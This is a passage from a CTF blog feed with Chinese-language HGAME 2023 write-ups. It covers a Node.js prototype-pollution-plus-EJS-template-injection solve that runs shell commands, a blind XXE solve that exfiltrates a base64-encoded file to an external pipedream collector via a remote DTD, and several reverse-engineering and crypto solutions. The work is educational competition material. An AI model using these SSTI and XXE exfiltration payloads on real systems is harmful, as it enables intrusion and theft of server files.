class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">diary</span> = diary</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;diary&#x27;</span>, &#123;<span class="attr">diary</span>: req.<span class="property">session</span>.<span class="property">diary</span>, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure><p>审计源码，<code>merge()</code> 函数存在原型链污染漏洞，但禁用了 <code>__proto__</code>，利用 <code>constructor.prototype</code> 绕过。</p><p>将 <code>user.role</code> 设置为<code>admin</code>，绕过权限控制后，进入 <code>/</code> 路由，而 <code>ejs.render()</code> 存在SSTI漏洞，设置 <code>diary</code> 值为 <code>&lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -al /&#39;) %&gt;</code> 即可RCE。</p><p>手动修改 <code>Content-Type</code> 为 <code>application/json</code>，POST payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;ttt&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;diary&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>hgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;</code>。</p><p>​    </p><h3 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h3><blockquote><p>Just tell me your thoughts</p></blockquote><p>查看源代码提示 <code>hint: ./www.zip</code>，查看 <code>send.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$xmldata</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$xmldata</span>))&#123;</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmldata</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;loading xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;name) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;email) || !<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;content))&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;name,email,content cannot be empty&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;name &amp;&amp; <span class="variable">$data</span>-&gt;email &amp;&amp; <span class="variable">$data</span>-&gt;content)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Success! I will see it later&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="string">&quot;Parse xml data error&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Request Method Not Allowed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>loadXML()+simplexml_import_dom()</code> 函数解析xml数据，存在XXE漏洞，但无可控制的回显信息，使用外带方式带出命令执行结果。</p><p>在VPS新建 <code>test.dtd</code>，内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://eo3dgkbstljeu1v.m.pipedream.net?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POST数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://VPS-IP/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;name&gt;s&lt;/name&gt;&lt;email&gt;d&lt;/email&gt;&lt;content&gt;sss&lt;/content&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>在pipedream得到回显：</p><p><code>https://eo3dgkbstljeu1v.m.pipedream.net?p=PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg==</code></p><p>base64解码得 <code>flag.php</code> 内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag1</span> = <span class="string">&quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>兔兔的电脑不小心中了病毒，病毒把他写的论文给加密了，你能帮兔兔恢复吗？</p></blockquote><p>Go程序，在 <code>main_main()</code> 中查看代码逻辑，结合题目，其中一个长base64编码字符串可能为调用的shellcode字符串。</p><p>提取出来：</p><p><code>VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D</code></p><p>解码后保存为文件，使用IDA查看，识别为函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_1</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+40h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 += <span class="number">0xABCDEF23</span>;</span><br><span class="line">    v2 += ((v3 &gt;&gt; <span class="number">5</span>) + <span class="number">33</span>) ^ (v3 + v4) ^ (<span class="number">16</span> * v3 + <span class="number">22</span>);</span><br><span class="line">    v3 += ((v2 &gt;&gt; <span class="number">5</span>) + <span class="number">55</span>) ^ (v2 + v4) ^ (<span class="number">16</span> * v2 + <span class="number">44</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v2;</span><br><span class="line">  result = a1 + <span class="number">1</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>易知代码为魔改了Delta值的TEA加密算法，解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xABCDEF23</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0xABCDEF23</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">c = [bytes_to_long(f[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)][::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">key = [<span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    d = decrypt(c[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    flag += long_to_bytes(d[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">               </span><br><span class="line"><span class="comment"># b&quot;hgame&#123;th1s_1s_th3_tutu&#x27;s_h0mew0rk&#125;\x00&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 3</title>
    <link href="https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/"/>
    <id>https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/</id>
    <published>2023-01-30T09:25:16.000Z</published>
    <updated>2023-01-30T06:01:55.753Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 7</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h3><blockquote><p>Just a very very very safe tunnel.</p><p>HINTS:</p><p>由于附件有问题分数下调至50分</p></blockquote><p>16进制查看器，搜索 <code>hgame</code> ，有 <code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="ezDH"><a href="#ezDH" class="headerlink" title="ezDH"></a>ezDH</h3><blockquote><p>这大过年的，Bob给Alice发了什么消息呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Alice_secret, Bob_secret, FLAG</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N=<span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">A = power_mod(g, Alice_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Alice send to Bob: &#123;&#123; &#x27;g&#x27;: &#123;g&#125;, &#x27;A&#x27;: &#123;A&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(g=g, A=<span class="built_in">hex</span>(A)))</span><br><span class="line">B = power_mod(g, Bob_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Bob send to Alice: &#123;&#123;&#x27;B&#x27;: &#123;B&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(B=<span class="built_in">hex</span>(B)))</span><br><span class="line"></span><br><span class="line">shared_secret = <span class="built_in">pow</span>(A, Bob_secret, N)</span><br><span class="line"></span><br><span class="line">p=<span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a=-<span class="number">3</span></span><br><span class="line">b=<span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E.random_point()</span><br><span class="line">Pa = shared_secret * G</span><br><span class="line">f.write(<span class="string">f&quot;Alice send to Bob: &#123;&#123; &#x27;E&#x27;: <span class="subst">&#123;E&#125;</span>, &#x27;G&#x27;: <span class="subst">&#123;G.xy()&#125;</span>, &#x27;Pa&#x27;: <span class="subst">&#123;Pa.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">k = random.randint(<span class="number">2</span>, p)</span><br><span class="line">m = E.lift_x(Integer(bytes_to_long(FLAG)))</span><br><span class="line">P1 = k * G</span><br><span class="line">P2 = k * Pa</span><br><span class="line">c = m + P2</span><br><span class="line">f.write(<span class="string">f&quot;Bob send to Alice: &#123;&#123; <span class="subst">&#123;P1.xy()&#125;</span>, <span class="subst">&#123;c.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>$N$ 为质数，$N-1$ 足够光滑，DLP易求，再利用 $c=m+P_2=m+kP_a=m+ksG=m+sP_1$，代入 $c,s,P_1$ 求得 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">A = <span class="number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span></span><br><span class="line">B = <span class="number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span></span><br><span class="line"></span><br><span class="line">b = discrete_log(mod(B,N),mod(g,N))</span><br><span class="line">s = <span class="built_in">pow</span>(A,b,N)</span><br><span class="line"></span><br><span class="line">p = <span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a = -<span class="number">3</span></span><br><span class="line">b = <span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E(<span class="number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)</span><br><span class="line">Pa = E(<span class="number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>)</span><br><span class="line">P1 = E(<span class="number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)</span><br><span class="line">c = E(<span class="number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)</span><br><span class="line"></span><br><span class="line">m = c - s*P1</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="RSA-大冒险2"><a href="#RSA-大冒险2" class="headerlink" title="RSA 大冒险2"></a>RSA 大冒险2</h3><blockquote><p>好耶，又是大冒险！</p><p>HINTS:</p><p>Challenge 3: p泄漏的位数不够多，导致coppersmith方法解不出来，那么有没有什么办法能够扩大coppersmith的界呢？注意coppersmith方法使用了LLL算法，那么这个界和格基又有什么关系呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span 